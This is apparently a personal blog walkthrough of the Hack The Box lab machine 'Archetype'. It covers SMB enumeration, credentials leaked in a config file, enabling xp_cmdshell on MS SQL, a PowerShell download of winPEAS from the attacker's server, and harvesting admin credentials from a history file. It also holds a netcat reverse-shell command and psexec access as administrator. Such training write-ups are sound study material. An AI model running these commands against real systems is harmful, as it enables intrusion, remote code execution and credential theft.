---
title: "HTB-Archetype"
description: "HTB-Archetype writeup"
date: 2022-10-17
tags: ["hack-the-box", "security"]
---

![](/ox-hugo/Archetype.png)

---

## Introduction

Hi everyone,

this is a full tutorial of the Starting Point machine “Archetype” on hack the box. If you have any suggestion / correction please contact me at **[matteolugli18@gmail.com](mailto:matteolugli18@gmail.com)**.

I will enable comments soon.

Enjoy.

---

## Enumeration

I always start htb boxes with nmap enumeration.

```bash
sudo nmap -sC -sV Archetype
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-21 18:40 CEST
Nmap scan report for Archetype (10.129.206.73)
Host is up (0.59s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info:
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-09-21T16:36:23
|_Not valid after:  2052-09-21T16:36:23
|_ssl-date: 2022-09-21T16:41:18+00:00; 0s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-09-21T16:41:11
|_  start_date: N/A
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-09-21T09:41:10-07:00
| ms-sql-info:
|   10.129.206.73:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_clock-skew: mean: 1h23m59s, deviation: 3h07m50s, median: 0s
```

1.  **msrpc, port 135** (Microsoft Remote Procedure Call): it is a protocol that enables one program to request a service from a program on another computer. It works in direct comunication with other network protocols (such as SMB or TCP) to make service requests on a remote server.
    
2.  **netbios-ssn, port 139**: netbios is a transportation layer that works with file sharing protocols like SMB, to allow file sharing on the same network.
    
3.  **microsoft-ds, port 445**: Later versions of SMB began to use port 445 on top of a TCP stack. This allows SMB to work over the internet.
    
    More informations here [https://www.varonis.com/blog/smb-port](https://www.varonis.com/blog/smb-port) if you are interested.
    
4.  **ms-sql-s, port 1443**: just a microsoft sql-server.
    

---

## SMB client

Given what we discovered during enumeration, the simplest thing to try is connecting to the machine using SMB client.

```bash
smbclient -N -L Archetype

     Sharename       Type      Comment
     ---------       ----      -------
     ADMIN$          Disk      Remote Admin
     backups         Disk
     C$              Disk      Default share
     IPC$            IPC       Remote IPC
```

-   **\-N**: I used this flag to suppres the password prompt, because we don’t have an access password. This time we got lucky and listed all the shares successfully.
-   **\-L**: this flag is used when you want to list all the services hosted on a particular server.

We notice the share called **backups**, which is the only non-admin share, that we might be able to access. Let’s do it using this command:

```bash
smbclient -N \\\\Archetype\\backups
smb: \> ls
ls
  .                                   D        0  Mon Jan 20 13:20:57 2020
  ..                                  D        0  Mon Jan 20 13:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 13:23:02 2020

	      5056511 blocks of size 4096. 2616242 blocks available
```

Looks like there is a suspicious file: prod.dtsConfig. Let’s take a peek and check what’s in there:

```bash
get prod.dtsConfig

<DTSConfiguration>
    <DTSConfigurationHeading>
	<DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
	<ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

We found some unprotected credentials!

**Password=M3g4c0rp123;User ID=ARCHETYPE\\sql\_svc**.

---

## Impacket

A simple way to connect to the ms-sql server is using **mssqlclient.py**, a really usefull tool when working with Windows network protocols. It is part of the collection of python scripts called **impacket**. You can find the download links here

[https://www.secureauth.com/labs/open-source-tools/impacket/](https://www.secureauth.com/labs/open-source-tools/impacket/)

At the beginning I struggled with finding the documentation for this tool, so i just runned the script with no options:

```bash
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

usage: mssqlclient.py [-h] [-port PORT] [-db DB] [-windows-auth] [-debug] [-file FILE]
		      [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
		      [-dc-ip ip address]
		      target

TDS client implementation (SSL supported).

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>

options:
  -h, --help            show this help message and exit
  -port PORT            target MSSQL port (default 1433)
  -db DB                MSSQL database instance (default None)
  -windows-auth         whether or not to use Windows Authentication (default False)
  -debug                Turn DEBUG output ON
  -file FILE            input file with commands to execute in the SQL shell
```

After a little bit i figured out the correct way to write the command:

```bash
python3 mssqlclient.py Archetype/sql_svc@10.129.206.73 -windows-auth
<client.py Archetype/sql_svc@10.129.206.73 -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:<insert password>
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server\0\0 (140 3232)
[!] Press help for extra shell commands
```

There we go, looks like we can send commands, so i tried to run a simple query:

```bash
SQL> select name from sys.databases
master
tempdb
model
msdb
```

---

## Command Shell

I found out that there is a way to execute commands remotly if we have access to a ms-sql server: we can use a *stored procedure* called **xp\_cmdshell**.

```sql
EXEC xp_cmdshell 'dir *.exe';

[-] ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell'
of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server.
A system administrator can enable the use of 'xp_cmdshell' by using sp_configure.
For more information about enabling 'xp_cmdshell',
search for 'xp_cmdshell' in SQL Server Books Online.
```

Turns out that we don’t have the permission to do that, because xp\_cmdshell is disabled in the configuration file. Let’s try to follow the suggestion given by the error prompt ('\[…\] *A system administrator can enable the use of ‘xp\_cmdshell’ by using sp\_configure*.').

With a quick google search i found out the correct way of using **sp\_configure** to enable the shell. (Maybie we are lucky and we can do it without admin privileges).

```sql
sp_configure 'show advanced options', '1'
sp_configure 'show advanced options', '1'
[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> reconfigure
reconfigure
SQL> RECONFIGURE
RECONFIGURE
SQL> EXEC sp_configure 'xp_cmdshell', '1'
EXEC sp_configure 'xp_cmdshell', '1'
[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE
RECONFIGURE
```

We can now re-try to send the previous command (*EXEC xp\_cmdshell ‘dir \*.exe’;'*), and we get a huge output. (It is not reported here, but all the executable files in the cwd should be listed in your terminal).

---

## WinPEAS

Not sure what to do next, i followed htb suggestion and looked up at the tool called **Winpeas**, a python script used to help attackers with *privilege escalation* on windows machines. It was originally made to enumerate all the possible ways or methods to get admin privileges on a Windows machine. To install it on kali or any debian-based distribution you can use the following command:

```bash
sudo apt install peass
```

Use this other command to locate all the executable files that you just downloaded:

```bash
winpeas --help
> peass ~ Privilege Escalation Awesome Scripts SUITE

/usr/share/peass/winpeas
 winPEASany.exe
 winPEASany_ofs.exe
 winPEAS.bat
 winPEASx64.exe
 winPEASx64_ofs.exe
 winPEASx86.exe
 winPEASx86_ofs.exe
```

Now I had to find a way to inject the executable file in the server. A simple way of doing it is setting up a python server on the local machine (that is by-default listening on port 8000). ***Remember to run the command from the directory where the winpeas .exe files are stored!*** (I lost a lot of time on this one point).

The directory should be /usr/share/peass/winpeas.

```bash
python3 -m http.server
```

Now we can use **powershell** to inject the file!

```sql
EXEC xp_cmdshell 'powershell.exe wget http://10.10.17.61:8000/winPEASx64.exe -OutFile c:\\Users\Public\\winPEASx64.exe';
```

The file should be loaded in the target machine. Now it’s just matter of executing it:

```sql
EXEC xp_cmdshell 'c:\\Users\Public\\winPEASx64.exe';

[...]
╔══════════╣ Found History Files

File: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

NULL
[...]
```

History files are usually vulnerable and a good source of information, let’s see what’s inside:

```sql
EXEC xp_cmdshell 'powershell.exe cat C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt';

net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

We found administrator credentials!

-   **user**: administrator
-   **password**: MEGACORP\_4dm1n!!

## ReverseShell

Now that we have admin credentials, it’s time to spawn a reverse-shell.

[https://pentestwiki.org/academy/how-to-get-a-xp\_cmdshell-reverse-shell/](https://pentestwiki.org/academy/how-to-get-a-xp_cmdshell-reverse-shell/)

```sql
EXEC xp_cmdshell "c:\\Users\Public\\nc.exe 10.10.17.61 9999 -e cmd.exe";
```

Now we can just navigate to C:\\Users\\sql\_svc\\Desktop and get the user flag. We are not done yet, because we still have to find the **root flag**.

Turns out that in Windows you can’t change privileges from inside the cmd prompt, so we need to find a way to spawn a shell *as administrator*. Guess what, impacket will help us one more time! [https://blog.ropnop.com/using-credentials-to-own-windows-boxes](https://blog.ropnop.com/using-credentials-to-own-windows-boxes)

We can use **psexec.py** to do exactly what we need:

```bash
psexec.py Archetype/administrator@10.129.189.185
```

Now just navigate to C:\\Users\\Administrator\\Desktop and get the root flag. You can use

```bash
more root.txt
```

> root flag –> b91ccec3305e98240082d4474b848528

Read other posts

---

[← About this website](/posts/about_this_website/) [HTB-Three →](/posts/three/)
